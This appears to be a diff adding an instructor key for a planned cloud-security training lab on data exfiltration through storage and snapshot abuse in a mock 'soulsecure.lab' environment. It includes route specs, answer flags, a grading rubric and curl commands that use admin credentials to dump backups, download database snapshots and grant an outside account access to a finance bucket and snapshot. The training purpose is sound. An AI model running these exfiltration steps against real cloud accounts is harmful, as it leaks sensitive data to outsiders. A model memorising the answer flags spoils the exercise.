@@ -1,0 +1,108 @@
+# Module 5 — Lab 4: Data Exfiltration via Storage & Snapshot Abuse — Instructor Key
+
+> **⚠️ PLANNED CONTENT — not yet built.** Build spec, implementation-ready. Requires
+> admin-equivalent credentials from Module 4 Lab 3 or Module 5 Lab 1's backdoors.
+> Flag values below are placeholders generated at planning time.
+
+## Cross-module extension: `backup-eu` app (Module 3)
+
+Add an admin-only route, gated by the same `X-Access-Key-Id`/`X-Secret-Access-Key`
+convention (checked against `iam-sim`-style admin-equivalent status, or — simpler,
+consistent with `storage_app.py`'s self-contained pattern — a hardcoded check that
+the presented Access Key ID is one of the known admin-equivalent values from Module
+4/5, e.g. `ASIAADMIN99` or any student-created backdoor's key):
+
+```
+GET /admin/export-all
+→ 200, reveals a manifest of every backup system SoulSecure runs (including ones
+  never otherwise mentioned in the engagement — a "there was more than you found"
+  reveal) + flag{0dfaaa8aef2374a4ae1fe9824225f782}
+```
+**Flag 1.**
+
+## New `iam-sim` routes: `rds/*`
+
+| Method | Path | Enforcement | Behavior |
+|---|---|---|---|
+| POST | `/rds/create-snapshot` | Admin-equivalent only | Body `{"db_instance": "soulsecure-prod-db"}` → `{"id": "snap-<random>", "status": "available"}` |
+| GET | `/rds/download-snapshot?id=<id>` | Admin-equivalent only | Returns a canned SQL-dump-shaped text file + `flag{ea9d12ed25af9413c87489dad20f0287}` appended as a trailing comment |
+| POST | `/rds/share-snapshot` | Admin-equivalent only | Body `{"snapshot_id":..., "target_account":...}` → `{"status":"shared","flag":"flag{222f054e7160f3ed0bf2e5d81b80b04d}"}` |
+
+## Cross-module extension: `storage` app (Module 3/4) — bucket policy route
+
+```
+POST /soulsecure-finance-records/_policy
+Body: {"add_principal_account": "<12-digit>"}
+Auth: admin-equivalent (same convention as above)
+→ 200, {"status": "policy updated", "flag": "flag{24c7e5fff5028119ff5ea792639037c6}"}
+
+GET /soulsecure-finance-records/_policy
+→ returns the current (now-modified) bucket policy JSON, for verification
+```
+**Flag 3.**
+
+## Flags (ground truth — placeholder values, see banner)
+
+| Flag | Location | Value |
+|---|---|---|
+| Flag 1 | `backup-eu.soulsecure.lab/admin/export-all` | `flag{0dfaaa8aef2374a4ae1fe9824225f782}` |
+| Flag 2 | `iam.soulsecure.lab/rds/download-snapshot` | `flag{ea9d12ed25af9413c87489dad20f0287}` |
+| Flag 3 | `storage.soulsecure.lab/soulsecure-finance-records/_policy` (POST) | `flag{24c7e5fff5028119ff5ea792639037c6}` |
+| Flag 4 (harder mode) | `iam.soulsecure.lab/rds/share-snapshot` | `flag{222f054e7160f3ed0bf2e5d81b80b04d}` |
+
+## Verification commands (once built)
+
+```bash
+curl -sk https://backup-eu.soulsecure.lab/admin/export-all \
+  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>"                # Flag 1
+
+curl -sk -X POST https://iam.soulsecure.lab/rds/create-snapshot \
+  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
+  -H 'Content-Type: application/json' -d '{"db_instance":"soulsecure-prod-db"}'
+curl -sk "https://iam.soulsecure.lab/rds/download-snapshot?id=<id>" \
+  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>"                # Flag 2
+
+curl -sk -X POST https://storage.soulsecure.lab/soulsecure-finance-records/_policy \
+  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
+  -H 'Content-Type: application/json' -d '{"add_principal_account":"999888777666"}'   # Flag 3
+
+curl -sk -X POST https://iam.soulsecure.lab/rds/share-snapshot \
+  -H "X-Access-Key-Id: ASIAADMIN99" -H "X-Secret-Access-Key: <secret>" \
+  -H 'Content-Type: application/json' -d '{"snapshot_id":"<id>","target_account":"999888777666"}'  # Flag 4
+```
+
+## Grading rubric (out of 100, proposed)
+
+| Criterion | Points |
+|---|---|
+| Accessed the admin-only backup export and correctly noted it was inaccessible with earlier credentials | 20 |
+| Created and downloaded a DB snapshot | 20 |
+| Modified the finance bucket's policy to add an external account | 25 |
+| Completed the cross-account snapshot share (harder mode) | 20 |
+| Correctly articulated the loud-vs-quiet detection-profile distinction between download and share techniques | 15 |
+
+## Design notes / narrative threads
+
+- `admin/export-all`'s reveal of backup systems "never otherwise mentioned" is a
+  deliberate world-building beat — reinforces that a real environment is always
+  bigger than what any one engagement fully maps, without needing to actually build
+  out those extra systems.
+- The download-vs-share contrast (Flags 2 and 4) is this lab's central lesson —
+  grade the *explanation* as heavily as the mechanics; a student who does both
+  techniques but can't articulate why an assessor would recommend against relying on
+  access-log monitoring alone hasn't fully gotten the point.
+
+## File locations (proposed)
+
+- `/opt/soulsecure-labs/apps/backup_app.py` (Module 3 file, cross-module edit) — add
+  `/admin/export-all`
+- `/opt/soulsecure-labs/apps/iam_sim.py` — add `SNAPSHOTS` dict + the three `rds/*`
+  routes
+- `/opt/soulsecure-labs/apps/storage_app.py` (Module 3/4 file, cross-module edit) —
+  add bucket-policy read/write routes for `soulsecure-finance-records`
+
+## Known limitations
+
+Same as other Module 4/5 `iam-sim`-adjacent labs. Snapshot content is canned, not a
+real database export. "External account" sharing doesn't model real cross-account
+AWS resource-sharing mechanics beyond the policy JSON shape.
